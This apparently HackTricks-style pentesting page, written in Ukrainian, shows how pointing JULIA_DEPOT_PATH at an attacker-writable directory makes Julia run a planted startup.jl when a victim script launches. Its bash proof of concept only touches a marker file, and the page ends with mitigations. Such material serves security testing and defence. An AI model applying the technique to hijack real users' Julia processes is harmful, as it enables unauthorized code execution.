# macOS Julia Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `JULIA_DEPOT_PATH` and `startup.jl`

Julia зазвичай виконує `config/startup.jl` із першого depot під час запуску. `JULIA_DEPOT_PATH` керує списком depot, тому його вказування на дерево, доступне для запису attacker, перенаправляє автоматично завантажуваний startup-файл.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```
Кінцевий роздільник корисний, коли жертві все ще потрібні її звичайні пакети. `julia --startup-file=no` вимикає цей startup file. Очистіть змінну перед запуском, оскільки вона також керує реєстрами пакетів, середовищами, кешами та розташуваннями завантаження коду.

## References

- [1] [Інтерфейс командного рядка Julia: файл запуску](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [2] [Змінні середовища Julia: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
{{#include ../../../banners/hacktricks-training.md}}
